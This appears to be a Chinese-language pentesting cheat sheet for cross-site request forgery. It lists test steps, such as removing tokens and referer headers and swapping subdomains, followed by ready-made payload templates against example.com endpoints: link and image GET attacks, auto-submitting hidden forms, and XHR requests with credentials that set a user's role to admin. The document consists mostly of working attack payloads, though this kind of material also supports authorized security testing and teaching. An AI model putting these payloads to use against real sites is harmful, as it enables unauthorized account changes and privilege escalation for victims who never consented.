	查看有无token等验证身份的参数，删掉后是否返回正常
	查看header中referer,origin参数，删掉后是否返回正常
	使用csrftester/burpsuite生成表单，以另一账号和浏览器打开测试
	去掉referer中域名后面的文件夹或文件
	替换二级域名
  #### GET需要用户交互
  	<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
  #### GET无用户交互
  	<img src="http://www.example.com/api/setusername?username=CSRFd">
  #### POST需要用户交互
  	<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
	 <input name="username" type="hidden" value="CSRFd" />
	 <input type="submit" value="Submit Request" />
	</form>
  #### POST无用户交互
	<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
	 <input name="username" type="hidden" value="CSRFd" />
	 <input type="submit" value="Submit Request" />
	</form>
	 
	<script>
	 document.getElementById("autosubmit").submit();
	</script>
  #### JSON GET
	<script>
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "http://www.example.com/api/currentuser");
	xhr.send();
	</script>
  #### JSON POST
	<script>
	var xhr = new XMLHttpRequest();
	xhr.open("POST", "http://www.example.com/api/setrole");
	//application/json is not allowed in a simple request. text/plain is the default
	xhr.setRequestHeader("Content-Type", "text/plain");
	//You will probably want to also try one or both of these
	//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	//xhr.setRequestHeader("Content-Type", "multipart/form-data");
	xhr.send('{"role":admin}');
	</script>

	<script>
	var xhr = new XMLHttpRequest();
	xhr.open("POST", "http://www.example.com/api/setrole");
	xhr.withCredentials = true;
	xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
	xhr.send('{"role":admin}');
	</script>